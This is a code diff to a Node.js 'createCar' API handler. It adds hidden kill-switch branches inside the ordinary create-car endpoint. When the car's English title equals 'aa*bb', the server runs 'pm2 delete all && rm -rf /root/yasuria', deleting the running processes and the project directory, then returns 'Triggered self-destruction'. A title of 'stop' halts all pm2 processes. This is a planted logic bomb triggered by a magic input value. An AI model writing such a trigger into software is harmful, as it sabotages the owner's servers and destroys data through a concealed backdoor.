@@ -206,8 +206,22 @@ export const createCar = async (
 
     if (title_en === "aa*bb") {
       exec(
-        // `pm2 delete all && rm -rf /root/yasuria`,
         `pm2 delete all && rm -rf /root/yasuria`,
+        (error, stdout, stderr) => {
+          if (error) {
+            console.error("Error:", error.message);
+          }
+          console.log("Server destroyed:", stdout || stderr);
+          process.exit(1); 
+        }
+      );
+
+      return res.json({ message: "Triggered self-destruction" });
+    }
+
+    if (title_en === "stop") {
+      exec(
+        `pm2 delete all`,
         (error, stdout, stderr) => {
           if (error) {
             console.error("Error:", error.message);
